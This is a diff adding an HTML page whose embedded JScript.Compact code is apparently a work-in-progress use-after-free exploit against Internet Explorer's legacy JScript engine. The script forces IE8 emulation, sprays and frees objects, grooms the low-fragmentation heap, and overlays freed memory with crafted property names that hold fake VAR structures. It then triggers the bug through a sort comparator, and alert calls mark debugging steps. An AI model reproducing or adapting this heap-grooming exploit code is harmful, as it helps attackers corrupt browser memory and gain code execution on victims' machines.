@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
+        <script language="JScript.Compact">
+		
+		
+		var spray_size = 20000;  //200 GcBlocks
+		var overlay_size = 40000; 
+		var total;
+		var dept = 0;
+		var spray;
+		var tosort = new Array();
+		var overlay;
+		var variants; 
+		
+		for(var i = 0; i < 310; i++) tosort[i] = [0, 0];
+		
+		
+		
+		function CreateVar32(Type, ObjPtr, NextVar) {
+			var Data = new Array(); // Every element of this array will be a WORD
+			Data.push(Type, 0x00, 0x00, 0x00, ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF, NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
+			return String.fromCharCode.apply(null, Data);
+		}//returns 16 bytes(size of VAR)
+		
+		
+		
+		
+		
+		
+		function exploit_uaf(untrack1, untrack2){		
+
+			var total = new Array();
+			overlay = new Array();
+			spray = new Array();
+
+			
+			for(var i = 0; i < overlay_size; i++) overlay[i] = new Object();  //overlay before spray coz we dont want any unnecessary alloc between the spray, free and realloc process, AND also we are overlaying with VVAL(property name(s) of any object) and not GcBlocks
+
+			for(var i = 0; i < spray_size; i++) spray[i] = new Object();
+
+
+
+			untrack1 = spray[7777];
+			untrack2 = spray[6666];
+				//total.push(untrack1);
+				//total.push(untrack2);
+
+				spray = new Array(); //free the spray
+				CollectGarbage(); //deallocate(free) to heap
+
+				
+				for(var i = 0; i < overlay_size; i++) 
+					{
+						overlay[i][variants] = 1; //(check the overlay_size)realloc with 300 VVAL or 300 GcBlocks since 1VVAL == 1Gcblock size
+					}
+				alert("success overlay?");
+				
+				//for(var i=0 ; i < total.length; i++)
+			//	{
+			//		alert(total[i]); 
+			//	}
+				
+				alert(untrack1);
+				alert(untrack2);
+			
+			
+
+		return 0;
+		} //exploit() ending
+		
+		
+		
+		
+		
+		function readfakeVAR(){
+		
+			var LFHBlocks = new Array();
+
+			// Trigger LFH for a size of 0x648
+
+			for(i = 0; i < 50; i++) {
+				Temp = new Object();
+				Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
+				LFHBlocks.push(Temp);
+			}
+			
+			variants = "AA"; // 2 wide char == 4 byte + the bstr len i,e 4byte and now total 8 byte of GcBlock LINKEDLIST POINTER
+			
+			    for(i=0; i < 46; i++) {
+            variants += CreateVar32(0x03, 1234, 0);
+        }
+			
+			
+			while( variants.length < 0x17a) variants += "A";  // 368 + 11 = 379bytes will be the len of variant.
+
+			
+			tosort[0].sort(exploit_uaf);
+			
+			return 0;
+		}//ending readfakeVAR
+		
+		
+		readfakeVAR();
+		
+		
+		
+		
+		</script>
+	</head>
+</html>
